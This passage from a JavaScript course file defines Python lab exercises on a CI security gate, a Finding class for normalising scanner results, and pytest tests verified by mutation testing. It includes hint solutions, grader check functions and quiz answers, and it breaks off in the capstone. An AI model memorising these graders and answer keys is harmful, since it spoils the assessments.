        text: "Print <code>BLOCK KSV-2041 (high) jinja2 sandbox escape (KSA-2026-0058)</code> for each blocking finding, then <code>Gate: FAIL (3 blocking, threshold high)</code> and exit with <b>1</b>; or, when nothing blocks, <code>Gate: PASS (threshold high)</code> and exit with <b>0</b>.",
        hints: ["Loop and print each blocking finding with an f-string. Then if blocking: print the FAIL line and sys.exit(1); else print the PASS line (reaching the end of the program means exit code 0).",
          'for f in blocking:\n    print(f"BLOCK {f[\'id\']} ({f[\'severity\']}) {f[\'title\']}")\nif blocking:\n    print(f"Gate: FAIL ({len(blocking)} blocking, threshold {fail_on})")\n    sys.exit(1)\nprint(f"Gate: PASS (threshold {fail_on})")'],
        check: py`
          def check(ns, out, run, src):
              import json
              env = {"KESTREL_API_TOKEN": "kc_demo_7f3a", "FAIL_ON": "high"}
              n, o, e = run(env=env)
              want = ["BLOCK KSV-2041 (high) jinja2 sandbox escape (KSA-2026-0058)", "BLOCK KSV-1187 (critical) Private key committed in deploy/",
                      "BLOCK KSV-0722 (high) Storage bucket allows public read", "Gate: FAIL (3 blocking, threshold high)"]
              got = [l for l in H.lines(o) if not l.startswith("::")]
              if got != want:
                  return "With FAIL_ON=high, expected:\n  " + "\n  ".join(want) + "\nYou printed:\n  " + "\n  ".join(got[:8] or ["(nothing)"])
              if n.get("__exit_code__") != 1:
                  return "When the gate fails, the exit code must be 1 so CI stops the build. It was " + str(n.get("__exit_code__")) + ". Use sys.exit(1)."
              orig = open("scan-results.json", newline="").read()
              try:
                  with open("scan-results.json", "w", newline="") as fh:
                      fh.write(json.dumps([{"id": "KSV-0311", "severity": "low", "title": "Missing HSTS header"}]))
                  n, o, e = run(env=env)
              finally:
                  with open("scan-results.json", "w", newline="") as fh:
                      fh.write(orig)
              if "Gate: PASS (threshold high)" not in H.lines(o):
                  return "With only a low finding, the gate should print Gate: PASS (threshold high)."
              if n.get("__exit_code__") != 0:
                  return "When the gate passes, the exit code must be 0, but it was " + str(n.get("__exit_code__")) + "."
              return True
        `
      },
      {
        id: "annotate",
        text: "When <code>GITHUB_ACTIONS</code> is <code>true</code>, also print <code>::error title=KSV-2041::jinja2 sandbox escape (KSA-2026-0058)</code> for each blocking finding (before the Gate line), so they show up in the pull request.",
        hints: ['in_actions = os.environ.get("GITHUB_ACTIONS") == "true". In the loop over blocking, if in_actions also print the ::error line.',
          'in_actions = os.environ.get("GITHUB_ACTIONS") == "true"\nfor f in blocking:\n    print(f"BLOCK {f[\'id\']} ({f[\'severity\']}) {f[\'title\']}")\n    if in_actions:\n        print(f"::error title={f[\'id\']}::{f[\'title\']}")'],
        check: py`
          def check(ns, out, run, src):
              n, o, e = run(env={"KESTREL_API_TOKEN": "kc_demo_7f3a", "FAIL_ON": "critical", "GITHUB_ACTIONS": "true"})
              ann = [l for l in H.lines(o) if l.startswith("::")]
              if ann != ["::error title=KSV-1187::Private key committed in deploy/"]:
                  return "With GITHUB_ACTIONS=true and FAIL_ON=critical, expected exactly one annotation:\n  ::error title=KSV-1187::Private key committed in deploy/\nYou printed:\n  " + ("\n  ".join(ann) or "(none)")
              lines = H.lines(o)
              if lines.index(ann[0]) > lines.index([l for l in lines if l.startswith("Gate:")][0]):
                  return "Print the annotations before the Gate line."
              n, o, e = run(env={"KESTREL_API_TOKEN": "kc_demo_7f3a", "FAIL_ON": "high"})
              if any(l.startswith("::") for l in H.lines(o)):
                  return "Without GITHUB_ACTIONS=true, don't print the ::error lines (they'd just be noise in a terminal)."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. The gate is now a required step: a pull request with a high or critical finding can't merge until it's fixed or someone with authority accepts the risk. Repos that aren't ready yet can start with <code>FAIL_ON=critical</code> and tighten it over time, with no code change.</p>" +
      "<p>You've just written the core of every CI security tool: read config from the environment, check something, <b>exit non-zero to stop the line</b>.</p>",
    realworld: "Scanners like trivy (--exit-code 1 --severity HIGH,CRITICAL) and bandit (exits 1 when it finds issues) are gates in exactly this way. In the DevOps track you'll put a gate like this into a real GitHub Actions workflow, with the token stored as a repository secret.",
    quiz: [
      { q: "The gate finds a critical issue. What makes the CI job fail?", options: ["Printing FAIL", "Exiting with a non-zero exit code", "Writing to stderr", "Raising the threshold"], answer: 1,
        why: "CI only looks at the exit code. Output is for humans." },
      { q: "Where should the API token come from in CI?", options: ["A constant in gate.py", "A config file in the repo", "An environment variable filled from the CI system's secret store", "The command-line arguments, printed for debugging"], answer: 2,
        why: "Secrets stay out of the code and Git history, and CI masks them in logs." },
      { q: "<code>os.environ[\"FAIL_ON\"]</code> when <code>FAIL_ON</code> isn't set gives…", options: ["None", "\"\"", "a KeyError", "\"high\""], answer: 2,
        why: "Like a dict. Use os.environ.get(\"FAIL_ON\", \"high\") to supply a default." }
    ]
  });

  /* ================================================================== PY-125 */
  var CLASS_DATA = py`
    bandit_results = [
        {"test_id": "B105", "issue_severity": "LOW", "issue_text": "Possible hardcoded password", "filename": "app/config.py", "line_number": 12},
        {"test_id": "B602", "issue_severity": "HIGH", "issue_text": "subprocess call with shell=True", "filename": "app/tasks.py", "line_number": 40},
    ]
    secret_results = [("repo/config/settings.py", 3, "AWS access key")]
    dependency_results = [
        {"package": "cryptography", "version": "42.0.0", "id": "KSA-2026-0107", "severity": "critical"},
        {"package": "jinja2", "version": "3.1.4", "id": "KSA-2026-0058", "severity": "medium"},
    ]
  `;

  LABS.push({
    id: "py-125", n: 25, module: 3, ticket: "PY-125", xp: 100,
    title: "One shape for every finding",
    topic: "Classes & objects",
    from: "Dev Patel · Security",
    story: "<p>We now run three scanners, and each one reports findings in its own shape: bandit gives dicts with <code>issue_severity</code>, your secrets scanner gives tuples, the dependency check gives something else again. Every report script needs three versions of the same code.</p>" +
      "<p>Let's define <b>one</b> <code>Finding</code> type that knows its own severity rank and how to print itself, convert everything into it, and write the report once.</p>",
    learn:
      "<h3>Classes bundle data with behaviour</h3><p>A <b>class</b> is a blueprint for a new type of value. Each value made from it is an <b>object</b> (or instance) with its own data (<b>attributes</b>) and functions that work on that data (<b>methods</b>).</p>" +
      ex('class Server:\n    def __init__(self, name, port):\n        self.name = name\n        self.port = port\n\n    def address(self):\n        return f"{self.name}:{self.port}"\n\n\nweb = Server("web-01", 443)\ndb = Server("db-01", 5432)\nprint(web.name, db.port)\nprint(web.address())') +
      '<table class="t"><tr><th>Piece</th><th>Meaning</th></tr>' +
      "<tr><td><code>class Server:</code></td><td>defines the type (class names use CapitalWords)</td></tr>" +
      "<tr><td><code>__init__</code></td><td>runs when you create one: <code>Server(\"web-01\", 443)</code></td></tr>" +
      "<tr><td><code>self</code></td><td>the object being created or used. Python passes it automatically.</td></tr>" +
      "<tr><td><code>self.name = name</code></td><td>stores an attribute on this object</td></tr>" +
      "<tr><td><code>def address(self):</code></td><td>a method: call it as <code>web.address()</code></td></tr></table>" +
      "<h3>Class attributes</h3><p>A value defined in the class body, outside any method, is shared by all objects. Use it for constants that belong to the type:</p>" +
      ex('class Server:\n    PUBLIC_PORTS = [80, 443]\n\n    def __init__(self, name, port):\n        self.name = name\n        self.port = port\n\n    def is_public(self):\n        return self.port in self.PUBLIC_PORTS\n\n\nprint(Server("web-01", 443).is_public(), Server("db-01", 5432).is_public())') +
      "<h3>How an object prints: __str__</h3><p>By default <code>print(obj)</code> shows something like <code>&lt;__main__.Server object at 0x...&gt;</code>. Define <code>__str__</code> to return the text <code>print()</code> and <code>str()</code> should use.</p>" +
      ex('class Server:\n    def __init__(self, name, port):\n        self.name = name\n        self.port = port\n\n    def __str__(self):\n        return f"{self.name} (port {self.port})"\n\n\nprint(Server("web-01", 443))') +
      "<h3>Sorting objects</h3><p>Python can't guess how to order your objects, so give <code>sorted()</code> a key. Negating a number sorts biggest first:</p>" +
      ex('ports = [("db-01", 5432), ("web-01", 443), ("cache-01", 6379)]\nprint(sorted(ports, key=lambda s: -s[1]))') +
      '<div class="callout">For classes that are mostly data, the standard library has a shortcut: <code>@dataclass</code> from <code>dataclasses</code> writes <code>__init__</code> for you. Writing it by hand first shows you what it does.</div>',
    starter: py`
      # PY-125 · One shape for every finding
      ` + "\n" + CLASS_DATA + "\n\n" + py`
      class Finding:
          pass


      # 4) findings: one Finding per result from all three scanners


      # 5) Print them, worst first, then the count at or above "high"
    `,
    objectives: [
      {
        id: "init",
        text: "<code>Finding(tool, severity, location, title)</code> stores those four as attributes, with <code>severity</code> converted to <b>lowercase</b>.",
        hints: ["def __init__(self, tool, severity, location, title): then self.tool = tool and so on. Use severity.lower() for self.severity.",
          "class Finding:\n    def __init__(self, tool, severity, location, title):\n        self.tool = tool\n        self.severity = severity.lower()\n        self.location = location\n        self.title = title"],
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              if not isinstance(C, type):
                  return "I can't find a class called Finding."
              try:
                  f = C("bandit", "HIGH", "app/tasks.py:40", "subprocess call with shell=True")
              except TypeError as e:
                  return "Finding(\"bandit\", \"HIGH\", \"app/tasks.py:40\", \"subprocess...\") failed: " + str(e) + ". Give __init__ the parameters self, tool, severity, location, title."
              for attr, want in [("tool", "bandit"), ("severity", "high"), ("location", "app/tasks.py:40"), ("title", "subprocess call with shell=True")]:
                  got = getattr(f, attr, "(missing)")
                  if got != want:
                      return "f." + attr + " should be " + repr(want) + " but it's " + H.short(got) + "." + (" Lowercase it with .lower()." if attr == "severity" and got == "HIGH" else "")
              g = C("deps", "Critical", "requirements.txt", "x")
              if g.severity != "critical" or f.severity != "high":
                  return "Each Finding should keep its own values (store them on self, not on the class)."
              return True
        `
      },
      {
        id: "rank",
        text: "Add a class attribute <code>LEVELS = [\"low\", \"medium\", \"high\", \"critical\"]</code>, a method <code>rank()</code> that returns the severity's position in it, and <code>is_blocking(threshold=\"high\")</code> that returns whether the finding is at or above the threshold.",
        hints: ["Put LEVELS in the class body. rank(self) returns self.LEVELS.index(self.severity). is_blocking compares self.rank() with self.LEVELS.index(threshold).",
          'class Finding:\n    LEVELS = ["low", "medium", "high", "critical"]\n\n    # __init__ as before\n\n    def rank(self):\n        return self.LEVELS.index(self.severity)\n\n    def is_blocking(self, threshold="high"):\n        return self.rank() >= self.LEVELS.index(threshold)'],
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              if not isinstance(C, type):
                  return "I can't find a class called Finding."
              if getattr(C, "LEVELS", None) != ["low", "medium", "high", "critical"]:
                  return "Finding.LEVELS should be the class attribute [\"low\", \"medium\", \"high\", \"critical\"]."
              for sev, want in [("LOW", 0), ("medium", 1), ("High", 2), ("critical", 3)]:
                  try:
                      got = C("t", sev, "x", "y").rank()
                  except Exception as e:
                      return "Finding(..., " + repr(sev) + ", ...).rank() crashed: " + type(e).__name__ + ": " + str(e)
                  if got != want:
                      return "rank() for severity " + repr(sev) + " should be " + str(want) + ", got " + H.short(got) + "."
              cases = [("high", None, True), ("medium", None, False), ("critical", None, True), ("medium", "medium", True), ("high", "critical", False), ("low", "low", True)]
              for sev, th, want in cases:
                  f = C("t", sev, "x", "y")
                  try:
                      got = f.is_blocking() if th is None else f.is_blocking(th)
                  except Exception as e:
                      return "is_blocking crashed: " + type(e).__name__ + ": " + str(e)
                  call = "is_blocking()" if th is None else "is_blocking(" + repr(th) + ")"
                  if got is not want:
                      return "A " + sev + " finding's " + call + " should be " + str(want) + ", got " + H.short(got) + "."
              return True
        `
      },
      {
        id: "str",
        text: "<code>str(finding)</code> (and so <code>print(finding)</code>) gives <code>[HIGH] app/tasks.py:40 subprocess call with shell=True (bandit)</code>.",
        hints: ["Define __str__(self) and return an f-string; self.severity.upper() gives HIGH.",
          'def __str__(self):\n    return f"[{self.severity.upper()}] {self.location} {self.title} ({self.tool})"'],
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              if not isinstance(C, type):
                  return "I can't find a class called Finding."
              try:
                  f = C("bandit", "HIGH", "app/tasks.py:40", "subprocess call with shell=True")
              except TypeError as e:
                  return "Finding(...) failed: " + str(e) + ". Write __init__ first (task 1)."
              want = "[HIGH] app/tasks.py:40 subprocess call with shell=True (bandit)"
              got = str(f)
              if "object at 0x" in got:
                  return "str(finding) still shows the default <... object at 0x...>. Define a __str__ method that returns the text."
              if got != want:
                  return "str(finding) should be:\n  " + want + "\nbut it's:\n  " + got
              g = C("deps", "medium", "requirements.txt", "jinja2 3.1.4 (KSA-2026-0058)")
              if str(g) != "[MEDIUM] requirements.txt jinja2 3.1.4 (KSA-2026-0058) (deps)":
                  return "For another finding, str() gave " + repr(str(g)) + ". Build it from self's attributes."
              return True
        `
      },
      {
        id: "convert",
        text: "<code>findings</code> is a list of <code>Finding</code> objects: bandit results (tool <code>\"bandit\"</code>, location <code>filename:line_number</code>, title <code>issue_text</code>), secret results (tool <code>\"secrets\"</code>, severity <code>\"critical\"</code>, location <code>path:line</code>, title = the kind) and dependency results (tool <code>\"deps\"</code>, location <code>\"requirements.txt\"</code>, title <code>\"cryptography 42.0.0 (KSA-2026-0107)\"</code>).",
        hints: ["Three loops, each appending Finding(...) to the same list. For bandit: Finding(\"bandit\", r[\"issue_severity\"], f\"{r['filename']}:{r['line_number']}\", r[\"issue_text\"]).",
          'findings = []\nfor r in bandit_results:\n    findings.append(Finding("bandit", r["issue_severity"], f"{r[\'filename\']}:{r[\'line_number\']}", r["issue_text"]))\nfor path, line, kind in secret_results:\n    findings.append(Finding("secrets", "critical", f"{path}:{line}", kind))\nfor d in dependency_results:\n    findings.append(Finding("deps", d["severity"], "requirements.txt", f"{d[\'package\']} {d[\'version\']} ({d[\'id\']})"))'],
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              fs = ns.get("findings")
              if not isinstance(fs, list):
                  return "I can't find a list called findings yet."
              if not all(isinstance(f, C) for f in fs):
                  return "Every item in findings should be a Finding object, made with Finding(...)."
              want = {"[LOW] app/config.py:12 Possible hardcoded password (bandit)",
                      "[HIGH] app/tasks.py:40 subprocess call with shell=True (bandit)",
                      "[CRITICAL] repo/config/settings.py:3 AWS access key (secrets)",
                      "[CRITICAL] requirements.txt cryptography 42.0.0 (KSA-2026-0107) (deps)",
                      "[MEDIUM] requirements.txt jinja2 3.1.4 (KSA-2026-0058) (deps)"}
              got = {str(f) for f in fs}
              if len(fs) != 5 or got != want:
                  miss = sorted(want - got)
                  return "findings should hold 5 findings." + ("\nMissing (as str()):\n  " + "\n  ".join(miss) if miss else "") + ("\nUnexpected:\n  " + "\n  ".join(sorted(got - want)) if got - want else "")
              new = H.sub(src, r"secret_results\s*=\s*\[[^\n]*\]", 'secret_results = [("a.py", 1, "GitHub token"), ("b.py", 2, "Private key")]')
              if new:
                  n, o, e = run(new)
                  if len(n.get("findings") or []) != 6:
                      return "With two secret results instead of one, findings should have 6 items. Build it with loops over the results."
              return True
        `
      },
      {
        id: "report",
        text: "Print every finding sorted <b>worst first</b> (highest rank), ties by location, then <code>3 blocking at threshold high</code>.",
        hints: ["sorted(findings, key=lambda f: (-f.rank(), f.location)). Count with sum(1 for f in findings if f.is_blocking()).",
          'for f in sorted(findings, key=lambda f: (-f.rank(), f.location)):\n    print(f)\nblocking = sum(1 for f in findings if f.is_blocking())\nprint(f"{blocking} blocking at threshold high")'],
        check: py`
          def check(ns, out, run, src):
              want = ["[CRITICAL] repo/config/settings.py:3 AWS access key (secrets)",
                      "[CRITICAL] requirements.txt cryptography 42.0.0 (KSA-2026-0107) (deps)",
                      "[HIGH] app/tasks.py:40 subprocess call with shell=True (bandit)",
                      "[MEDIUM] requirements.txt jinja2 3.1.4 (KSA-2026-0058) (deps)",
                      "[LOW] app/config.py:12 Possible hardcoded password (bandit)",
                      "3 blocking at threshold high"]
              return H.printed(out, want)
        `
      }
    ],
    debrief: "<p>Ticket closed. Adding a fourth scanner now means writing one small converter; the sorting, the threshold and the report work unchanged, because they only talk to <code>Finding</code>. That's the payoff of a class: one clear shape that the rest of the code can rely on.</p>" +
      "<p>You'll use <code>Finding</code> again in the Module 3 capstone.</p>",
    realworld: "This is the idea behind formats like SARIF, the standard JSON format for static-analysis results: GitHub code scanning, bandit, semgrep and many more all speak it, so one dashboard can show findings from every tool.",
    quiz: [
      { q: "What is <code>self</code> inside a method?", options: ["The class itself", "The object the method was called on", "A keyword that does nothing", "The module"], answer: 1,
        why: "web.address() calls Server.address(web): self is web." },
      { q: "When does <code>__init__</code> run?", options: ["When the class is defined", "When you create an object, e.g. Finding(...)", "When you print the object", "Only if you call it yourself"], answer: 1,
        why: "Calling the class creates the object and runs __init__ to set it up." },
      { q: "<code>LEVELS</code> is defined in the class body. Where is it stored?", options: ["Separately on each object", "Once, on the class, shared by all its objects", "In a global variable", "Nowhere until __init__ runs"], answer: 1,
        why: "Class attributes belong to the class. self.LEVELS finds it there." }
    ]
  });

  /* ================================================================== PY-126 */
  var FAKE_PYTEST = py`
    import sys as _sys


    def _install_pytest():
        import types, traceback, re
        sys_ = _sys

        m = types.ModuleType("pytest")
        m.__doc__ = "A tiny stand-in for pytest, built into the lab: pytest.raises and run_tests()."

        class _Raises:
            def __init__(self, exc, match=None):
                self.exc = exc
                self.match = match
                self.value = None

            def __enter__(self):
                return self

            def __exit__(self, et, ev, tb):
                if et is None:
                    raise AssertionError("DID NOT RAISE " + self.exc.__name__)
                if not issubclass(et, self.exc):
                    return False
                if self.match is not None and not re.search(self.match, str(ev)):
                    raise AssertionError("Regex " + repr(self.match) + " did not match " + repr(str(ev)))
                self.value = ev
                return True

        def raises(exc, match=None):
            return _Raises(exc, match)

        m.raises = raises
        sys_.modules["pytest"] = m

        def run_tests():
            """Run every function whose name starts with test_, the way pytest would."""
            g = sys_._getframe(1).f_globals
            tests = [(n, f) for n, f in list(g.items()) if n.startswith("test_") and callable(f)]
            passed = failed = 0
            for name, f in tests:
                try:
                    f()
                except Exception as e:
                    failed += 1
                    frames = [x for x in traceback.extract_tb(e.__traceback__) if x.filename == "<your code>"]
                    where = ""
                    if frames:
                        where = " (line " + str(frames[-1].lineno) + ": " + (frames[-1].line or "").strip() + ")"
                    msg = str(e) if not isinstance(e, AssertionError) or str(e) else "assert failed"
                    if not isinstance(e, AssertionError):
                        msg = type(e).__name__ + ": " + msg
                    print("FAILED " + name + " - " + msg + where)
                else:
                    passed += 1
                    print("PASSED " + name)
            print(str(passed) + " passed" + (", " + str(failed) + " failed" if failed else ""))
            return failed == 0

        return run_tests


    run_tests = _install_pytest()
    del _install_pytest, _sys
  `;

  // PY-126 checks: run the learner's tests against parse_port implementations with known bugs (mutation testing).
  var MUTANTS = py`
    import io as _io, contextlib as _cl

    def good(value):
        value = value.strip()
        if not value.isdigit():
            raise ValueError("not a port number: " + repr(value))
        port = int(value)
        if not 1 <= port <= 65535:
            raise ValueError("port out of range: " + str(port))
        return port

    def returns_text(value):
        good(value)
        return value.strip()

    def no_strip(value):
        if not value.isdigit():
            raise ValueError("not a port number")
        return good(value)

    def allows_zero(value):
        if value.strip() == "0":
            return 0
        return good(value)

    def allows_65536(value):
        if value.strip() == "65536":
            return 65536
        return good(value)

    def allows_float(value):
        v = value.strip()
        if v.replace(".", "", 1).isdigit() and "." in v:
            return good(str(int(float(v))))
        return good(value)

    def empty_is_none(value):
        if not value.strip():
            return None
        return good(value)

    def passes(ns, test, impl):
        old = ns.get("parse_port")
        ns["parse_port"] = impl
        try:
            with _cl.redirect_stdout(_io.StringIO()):
                ns[test]()
            return True
        except Exception:
            return False
        finally:
            ns["parse_port"] = old

    def mutation_check(ns, test, mutants):
        if not callable(ns.get(test)):
            return "I can't find a function called " + test + "."
        if not passes(ns, test, good):
            return test + " fails against the correct parse_port. A test must pass when the code is right; check your expected values."
        for impl, bug in mutants:
            if passes(ns, test, impl):
                return test + " still passes when parse_port has this bug: " + bug + ". Add an assert that catches it."
        return True
  ` + "\n\n";

  LABS.push({
    id: "py-126", n: 26, module: 3, ticket: "PY-126", xp: 100,
    title: "Prove it works",
    topic: "Testing: assert & pytest",
    from: "Maya Chen · SRE lead",
    story: "<p>Our firewall-rule tool takes ports as text from a config file. Last month someone \"tidied up\" <code>parse_port</code>, port 0 slipped through, and a rule opened <b>every</b> port for an hour. Nobody noticed, because nothing checked.</p>" +
      "<p>Write tests that pin down exactly what <code>parse_port</code> must do, so the next bad change fails the build instead of reaching production. And while you're there, the existing test for <code>parse_ports</code> is failing.</p>",
    learn:
      '<div class="callout"><b>A mini pytest.</b> The real pytest is a command-line program, so this lab has a small built-in version: <code>import pytest</code> gives you <code>pytest.raises</code>, and calling <code>run_tests()</code> runs all your <code>test_</code> functions and prints the results the way pytest does.</div>' +
      "<h3>assert</h3><p><code>assert condition</code> does nothing when the condition is true, and raises <code>AssertionError</code> when it's false. A <b>test</b> is just a function full of asserts about what some code should do.</p>" +
      ex('def add_vat(price):\n    return round(price * 1.1, 2)\n\nassert add_vat(100) == 110.0\nprint("first check passed")\nassert add_vat(10) == 12, "10 plus 10% should be 11, not 12"') +
      "<h3>pytest's conventions</h3><p>pytest finds files named <code>test_*.py</code>, runs every function in them whose name starts with <code>test_</code>, and reports which ones raised. In a real project you run it from the terminal:</p>" +
      '<pre class="code">$ pytest -q\n..F\nFAILED test_ports.py::test_parse_ports - assert [80, 443, 22] == [22, 80, 443]\n1 failed, 2 passed</pre>' +
      "<h3>Testing that errors happen</h3><p>Rejecting bad input is half of what security code does, so test it. <code>pytest.raises</code> passes only if the code inside raises that exception:</p>" +
      ex('import pytest\n\nwith pytest.raises(ValueError):\n    int("not a number")\nprint("ValueError raised, as expected")\n\nwith pytest.raises(ValueError):\n    int("42")') +
      "<h3>What to test</h3><ul><li><b>Normal cases:</b> <code>\"22\"</code> → <code>22</code>.</li><li><b>Edges:</b> the exact limits, <code>1</code> and <code>65535</code>, and one past them, <code>0</code> and <code>65536</code>. Bugs love boundaries.</li><li><b>Garbage:</b> <code>\"\"</code>, <code>\"abc\"</code>, <code>\"22.5\"</code>, spaces.</li><li><b>Types:</b> <code>22</code> and <code>\"22\"</code> are different. Check you get an <code>int</code>.</li></ul>" +
      "<p>A good test <b>fails when the code is wrong</b>. The checks in this lab plant real bugs in <code>parse_port</code> and make sure your tests catch each one.</p>",
    starter: py`
      # PY-126 · Prove it works
      import pytest


      def parse_port(value):
          """Turn text like "443" into a port number 1-65535. Raise ValueError for anything else."""
          value = value.strip()
          if not value.isdigit():
              raise ValueError(f"not a port number: {value!r}")
          port = int(value)
          if not 1 <= port <= 65535:
              raise ValueError(f"port out of range: {port}")
          return port


      def parse_ports(text):
          """ "443, 22,80" -> [22, 80, 443]: sorted, without duplicates."""
          ports = [parse_port(part) for part in text.split(",")]
          return list(set(ports))


      def test_parse_ports():
          assert parse_ports("443, 22,80,22") == [22, 80, 443]


      def test_valid_ports():
          pass


      def test_rejects_out_of_range():
          pass


      def test_rejects_garbage():
          pass


      run_tests()
    `,
    prelude: FAKE_PYTEST,
    objectives: [
      {
        id: "valid",
        text: "<code>test_valid_ports()</code> asserts what <code>parse_port</code> returns for good input, including the limits and surrounding spaces. It must catch a version that returns the <b>string</b> instead of an int, and one that doesn't <b>strip</b> spaces.",
        hints: ['Compare with ints: assert parse_port("22") == 22. Include "1", "65535" and " 443 ".',
          'def test_valid_ports():\n    assert parse_port("22") == 22\n    assert parse_port("1") == 1\n    assert parse_port("65535") == 65535\n    assert parse_port(" 443 ") == 443'],
        check: MUTANTS + py`
          def check(ns, out, run, src):
              return mutation_check(ns, "test_valid_ports", [(returns_text, "it returns the text \"22\" instead of the number 22"),
                                                             (no_strip, "it rejects \" 443 \" because it doesn't strip spaces")])
        `
      },
      {
        id: "range",
        text: "<code>test_rejects_out_of_range()</code> uses <code>pytest.raises(ValueError)</code> to check that ports just outside the range are refused. It must catch a version that accepts <code>0</code> and one that accepts <code>65536</code>.",
        hints: ["One with pytest.raises(ValueError): block per value; once the first line inside raises, the rest of the block is skipped.",
          'def test_rejects_out_of_range():\n    with pytest.raises(ValueError):\n        parse_port("0")\n    with pytest.raises(ValueError):\n        parse_port("65536")'],
        check: MUTANTS + py`
          def check(ns, out, run, src):
              return mutation_check(ns, "test_rejects_out_of_range", [(allows_zero, "it accepts port 0"), (allows_65536, "it accepts port 65536")])
        `
      },
      {
        id: "garbage",
        text: "<code>test_rejects_garbage()</code> checks that text that isn't a whole number raises <code>ValueError</code>. It must catch a version that accepts <code>\"22.5\"</code> and one that returns <code>None</code> for an empty string.",
        hints: ["Same pattern as the range test, with values like \"abc\", \"\" and \"22.5\". Use a loop over the bad values to keep it short.",
          'def test_rejects_garbage():\n    for bad in ["abc", "", "22.5", "-1"]:\n        with pytest.raises(ValueError):\n            parse_port(bad)'],
        check: MUTANTS + py`
          def check(ns, out, run, src):
              return mutation_check(ns, "test_rejects_garbage", [(allows_float, "it accepts \"22.5\" (as 22)"), (empty_is_none, "it returns None for \"\" instead of raising")])
        `
      },
      {
        id: "fix",
        text: "<code>test_parse_ports</code> fails. Read its output, fix <code>parse_ports</code> (not the test), and make <code>run_tests()</code> report every test passing.",
        hints: ["A set has no order. Python happens to give the ports back as [80, 443, 22]. sorted() returns a sorted list.",
          "def parse_ports(text):\n    return sorted(set(parse_port(part) for part in text.split(\",\")))"],
        check: py`
          def check(ns, out, run, src):
              import re
              f = H.fn(ns, "parse_ports")
              if not f:
                  return "I can't find parse_ports."
              for text, want in [("443, 22,80,22", [22, 80, 443]), ("8080", [8080]), ("443,22", [22, 443]), (" 9000 ,9000, 53", [53, 9000])]:
                  ok, got = H.call(f, text)
                  if not ok or got != want:
                      return "parse_ports(" + repr(text) + ") should be " + str(want) + ", got " + (H.short(got) if ok else type(got).__name__) + "."
              for bad in ["22,abc", "22,0", "443,70000"]:
                  ok, got = H.call(f, bad)
                  if ok:
                      return "parse_ports(" + repr(bad) + ") should raise ValueError, but returned " + H.short(got) + ". Keep using parse_port for each part, so every port is validated."
              if "def test_parse_ports():\n    assert parse_ports(\"443, 22,80,22\") == [22, 80, 443]" not in src:
                  return "Fix parse_ports, not the test: test_parse_ports should stay as it was."
              summary = [l for l in H.lines(out) if re.match(r"^\d+ passed", l)]
              if not summary:
                  return "Call run_tests() at the end so the tests run."
              if "failed" in summary[-1] or int(summary[-1].split()[0]) < 4:
                  return "run_tests() should report all 4 tests passing; it says: " + summary[-1]
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. Your tests now catch six real bugs, including the port-0 one from last month. Run them in CI and that change could never have merged.</p>" +
      "<p>What the checks did to your tests has a name: <b>mutation testing</b>. Plant a bug and see whether any test notices. Tests that pass no matter what (like an empty <code>pass</code>) give false confidence, which in security is worse than none.</p>",
    realworld: "In a real project: pip install pytest, put tests in tests/test_*.py, and run pytest in CI. Security teams write tests like these for input validation, permission checks and every bug they fix (a regression test), so the bug can't quietly come back. Tools like mutmut automate mutation testing.",
    quiz: [
      { q: "Your test is just <code>def test_x(): pass</code>. What does pytest report?", options: ["Failed", "Passed", "Skipped", "An error"], answer: 1,
        why: "A test fails only if something inside raises. An empty test always passes and proves nothing." },
      { q: "Which inputs best test the range 1–65535?", options: ["10, 100, 1000", "0, 1, 65535, 65536", "Random numbers", "Only 443"], answer: 1,
        why: "Bugs cluster at boundaries: test the limits and one step past each." },
      { q: "<code>with pytest.raises(ValueError): parse_port(\"22\")</code> — what happens?", options: ["The test passes", "The test fails: DID NOT RAISE ValueError", "parse_port raises", "Nothing"], answer: 1,
        why: "\"22\" is valid, so no ValueError, and pytest.raises fails the test." }
    ]
  });

  /* ================================================================== PY-127 capstone */
  var GATE_FILES = { "requirements.txt": REQUIREMENTS, "advisories.json": JSON.stringify(ADVISORIES, null, 2) + "\n" };
  Object.keys(REPO).forEach(function (k) { GATE_FILES[k] = REPO[k]; });

  var GATE_WANT = py`
    WANT = ["[CRITICAL] repo/config/settings.py:3 AWS access key (secrets)",
            "[CRITICAL] repo/deploy/id_ed25519:1 Private key (secrets)",
            "[CRITICAL] requirements.txt cryptography 42.0.0 -> 42.0.4 (KSA-2026-0107) (deps)",
            "[HIGH] repo/app.py:3 GitHub token (secrets)",
            "[HIGH] requirements.txt django 4.2.10 -> 4.2.16 (KSA-2026-0031) (deps)",
            "[MEDIUM] repo/config/settings.py:5 Hard-coded password (secrets)",
            "[MEDIUM] requirements.txt jinja2 3.1.4 -> 3.1.5 (KSA-2026-0058) (deps)",
            "[MEDIUM] requirements.txt requests 2.31.0 -> 2.32.0 (KSA-2026-0044) (deps)",
            "[LOW] requirements.txt flask is not pinned (deps)"]
    ARGS = "repo --requirements requirements.txt --advisories advisories.json"

    def gate(run, argv=ARGS, env=None):
        n, o, e = run(argv=argv, env=env if env is not None else {"FAIL_ON": "high"})
        return n, H.lines(o), e, n.get("__exit_code__")
  ` + "\n\n";

  LABS.push({
    id: "py-127", n: 27, module: 3, ticket: "PY-127", xp: 200, capstone: true,
    title: "Ship the security gate",
    topic: "Module 3 capstone project",
    from: "Dev Patel & Maya Chen",
    story: "<p>Time to put the pieces together. Every pull request at Kestrel will run <b>one</b> command, <code>python gate.py repo</code>, that scans the code for secrets and the dependencies for advisories, prints everything it found worst-first, and <b>fails the build</b> if anything is at or above the threshold.</p>" +
      "<p>It has to behave like a real tool: arguments, an environment-variable default, a JSON report for the dashboard, annotations in GitHub, and the right exit code. It's everything from Module 3 in one program.</p>",
    learn:
      '<div class="callout warn"><b>Capstone rules.</b> There are no hints. Build one piece at a time and try each in the console after pressing Run, e.g. <code>scan_secrets("repo")</code>. Edit the Arguments and Environment boxes to try different runs. ' +
      "If you get completely stuck, the Tasks tab has a button to reveal the full solution. The capstone then earns half XP.</div>" +
      "<h3>The files</h3>" +
      '<table class="t"><tr><th>File</th><th>From</th></tr>' +
      "<tr><td><code>repo/</code></td><td>the release-bot repo from PY-121 (4 secrets in it)</td></tr>" +
      "<tr><td><code>requirements.txt</code>, <code>advisories.json</code></td><td>the dependency files from PY-122</td></tr></table>" +
